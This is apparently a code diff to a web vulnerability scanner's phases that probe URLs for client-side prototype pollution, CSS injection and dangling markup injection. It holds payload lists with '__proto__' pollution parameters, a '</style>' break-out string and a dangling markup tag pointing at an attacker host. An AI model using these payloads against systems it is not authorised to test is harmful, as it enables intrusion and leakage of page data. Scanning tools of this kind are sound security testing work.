@@ -1,6 +1,7 @@
 """Client-side vulnerability phases v2: prototype pollution, CSS injection, dangling markup."""
 
 import asyncio
+import secrets
 import urllib.error
 import urllib.parse
 import urllib.request
@@ -39,7 +40,7 @@ async def phase_170_CLIENTPP(
     _out = outdir / "client_pp.txt"
     if _out.exists() and not force:
         return {"170-CLIENTPP": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 170-CLIENTPP: Client-Side Prototype Pollution")
+    log("INFO", "Phase 170-CLIENTPP: Client-Side Prototype Pollution")
     findings: List[str] = []
     _pp_urlopen = _get_urlopener()
     _pp_extra_headers = _extra_headers_dict()
@@ -47,14 +48,15 @@ async def phase_170_CLIENTPP(
     urls_file = Path(urls_src)
     all_urls = read_lines(urls_file) if urls_file.exists() else []
     if not all_urls:
-        log("warn", "170-CLIENTPP: no URLs; skipping")
+        log("WARNING", "170-CLIENTPP: no URLs; skipping")
         return {"170-CLIENTPP": str(_out), "count": 0}
     # Payloads for prototype pollution
+    pp_canary = secrets.token_hex(8)
     pp_payloads = [
-        ("__proto__[test]", "true"),
-        ("__proto__[polluted]", "true"),
-        ("constructor[prototype][test]", "true"),
-        ("constructor[prototype][polluted]", "true"),
+        ("__proto__[test]", pp_canary),
+        ("__proto__[polluted]", pp_canary),
+        ("constructor[prototype][test]", pp_canary),
+        ("constructor[prototype][polluted]", pp_canary),
     ]
     pp_indicators = ["__proto__", "[object Object]", "constructor.prototype"]
 
@@ -76,7 +78,7 @@ async def phase_170_CLIENTPP(
                 )
                 _, _, resp_body = await _async_urlopen(_pp_urlopen, req, timeout=10)
                 body_text = resp_body.decode("utf-8", errors="ignore")
-                if param in body_text or val in body_text:
+                if val in body_text:
                     results.append(
                         f"[pp-reflection] {test_url} — {param}={val} reflected in response"
                     )
@@ -125,7 +127,7 @@ async def phase_170_CLIENTPP(
         findings.append("[result] No prototype pollution candidates detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"170-CLIENTPP: {len(findings)} probes → {out}")
+    log("OK", f"170-CLIENTPP: {len(findings)} probes → {out}")
     return {"170-CLIENTPP": str(out), "count": len(findings)}
 
 
@@ -142,7 +144,7 @@ async def phase_171_CSSINJECT(
     _out = outdir / "css_inject.txt"
     if _out.exists() and not force:
         return {"171-CSSINJECT": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 171-CSSINJECT: CSS Injection detection")
+    log("INFO", "Phase 171-CSSINJECT: CSS Injection detection")
     findings: List[str] = []
     _css_urlopen = _get_urlopener()
     _css_extra_headers = _extra_headers_dict()
@@ -151,7 +153,7 @@ async def phase_171_CSSINJECT(
     urls_file = Path(urls_src)
     all_urls = read_lines(urls_file) if urls_file.exists() else []
     if not all_urls:
-        log("warn", "171-CSSINJECT: no URLs; skipping")
+        log("WARNING", "171-CSSINJECT: no URLs; skipping")
         return {"171-CSSINJECT": str(_out), "count": 0}
     css_payloads = [
         "</style><img src=x>",
@@ -193,7 +195,7 @@ async def phase_171_CSSINJECT(
                         results.append(
                             f"[css-inject] {test_url} via {param_name} — payload reflected: {payload[:60]}"
                         )
-                    if "</style>" in payload and "</style>" in body_text:
+                    if "</style>" in payload and stripped_payload in body_text:
                         results.append(
                             f"[css-inject-style-close] {test_url} via {param_name} — style tag closed"
                         )
@@ -217,7 +219,7 @@ async def phase_171_CSSINJECT(
         findings.append("[result] No CSS injection candidates detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"171-CSSINJECT: {len(findings)} probes → {out}")
+    log("OK", f"171-CSSINJECT: {len(findings)} probes → {out}")
     return {"171-CSSINJECT": str(out), "count": len(findings)}
 
 
@@ -234,7 +236,7 @@ async def phase_172_DANGLING(
     _out = outdir / "dangling_markup.txt"
     if _out.exists() and not force:
         return {"172-DANGLING": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 172-DANGLING: Dangling Markup Injection")
+    log("INFO", "Phase 172-DANGLING: Dangling Markup Injection")
     findings: List[str] = []
     _dm_urlopen = _get_urlopener()
     _dm_extra_headers = _extra_headers_dict()
@@ -244,7 +246,7 @@ async def phase_172_DANGLING(
     urls_file = Path(urls_src)
     all_urls = read_lines(urls_file) if urls_file.exists() else []
     if not all_urls:
-        log("warn", "172-DANGLING: no URLs; skipping")
+        log("WARNING", "172-DANGLING: no URLs; skipping")
         return {"172-DANGLING": str(_out), "count": 0}
     dangling_payloads = [
         f'<img src="//{attacker_host}/',
@@ -298,5 +300,5 @@ async def phase_172_DANGLING(
         findings.append("[result] No dangling markup injection candidates detected")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"172-DANGLING: {len(findings)} probes → {out}")
+    log("OK", f"172-DANGLING: {len(findings)} probes → {out}")
     return {"172-DANGLING": str(out), "count": len(findings)}
